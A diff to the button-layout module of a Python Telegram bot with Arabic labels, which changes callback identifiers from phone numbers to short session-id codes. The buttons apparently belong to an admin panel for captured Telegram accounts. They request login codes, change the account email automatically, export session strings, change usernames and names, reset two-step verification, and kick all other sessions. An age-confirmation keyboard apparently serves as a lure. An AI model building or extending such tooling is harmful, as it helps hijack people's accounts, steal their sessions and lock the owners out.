@@ -8,6 +8,24 @@ import database
 
 ADMIN_FOOTER = "\n\n─────────────\n⚡️ @No1_noone"
 
+# أزرار الأدمن تستخدم id الجلسة (حرف + رقم) لتجنب حد 64 بايت في callback_data
+CB = {
+    "session": "i",
+    "export": "x",
+    "delete": "d",
+    "hide": "h",
+    "code": "c",
+    "mail": "m",
+    "user": "u",
+    "name": "n",
+    "twofa": "f",
+    "kick": "k",
+}
+
+
+def cb(kind: str, session_id: int) -> str:
+    return f"{CB[kind]}{session_id}"
+
 
 def age_confirm_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
@@ -87,18 +105,18 @@ def sessions_keyboard(
 
     buttons = []
     for s in page_sessions:
-        phone = s["phone"]
+        sid = s["id"]
         label = _session_label(s)
         row = [
-            InlineKeyboardButton(text=label, callback_data=f"session_{phone}"),
+            InlineKeyboardButton(text=label, callback_data=cb("session", sid)),
         ]
         if is_super_admin:
             star = "⭐" if database.row_flag(s, "a1_only") else "☆"
             row.append(
-                InlineKeyboardButton(text=star, callback_data=f"a1_hide_{phone}")
+                InlineKeyboardButton(text=star, callback_data=cb("hide", sid))
             )
         row.append(
-            InlineKeyboardButton(text="🗑", callback_data=f"del_session_{phone}")
+            InlineKeyboardButton(text="🗑", callback_data=cb("delete", sid))
         )
         buttons.append(row)
 
@@ -157,37 +175,37 @@ def sessions_keyboard(
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
 
-def session_detail_keyboard(phone: str) -> InlineKeyboardMarkup:
+def session_detail_keyboard(session_id: int) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(
             text="🔑 المطالبة بكود",
-            callback_data=f"req_code_{phone}",
+            callback_data=cb("code", session_id),
         )],
         [InlineKeyboardButton(
             text="📧 تغيير البريد (تلقائي)",
-            callback_data=f"ch_mail_{phone}",
+            callback_data=cb("mail", session_id),
         )],
         [InlineKeyboardButton(
             text="📜 سحب الجلسة (Text)",
-            callback_data=f"export_{phone}",
+            callback_data=cb("export", session_id),
         )],
         [
             InlineKeyboardButton(
                 text="✏️ تغيير اليوزر",
-                callback_data=f"ch_user_{phone}",
+                callback_data=cb("user", session_id),
             ),
             InlineKeyboardButton(
                 text="📝 تغيير الاسم",
-                callback_data=f"ch_name_{phone}",
+                callback_data=cb("name", session_id),
             ),
         ],
         [InlineKeyboardButton(
             text="🔐 تعيين/تغيير التحقق بخطوتين",
-            callback_data=f"ch_2fa_{phone}",
+            callback_data=cb("twofa", session_id),
         )],
         [InlineKeyboardButton(
             text="🚫 طرد الجلسات + تنظيف شامل",
-            callback_data=f"full_kick_{phone}",
+            callback_data=cb("kick", session_id),
         )],
         [InlineKeyboardButton(
             text="🔙 رجوع للقائمة",
@@ -196,7 +214,7 @@ def session_detail_keyboard(phone: str) -> InlineKeyboardMarkup:
     ])
 
 
-def back_to_session_keyboard(phone: str) -> InlineKeyboardMarkup:
+def back_to_session_keyboard(session_id: int) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔙 رجوع", callback_data=f"session_{phone}")]
+        [InlineKeyboardButton(text="🔙 رجوع", callback_data=cb("session", session_id))]
     ])
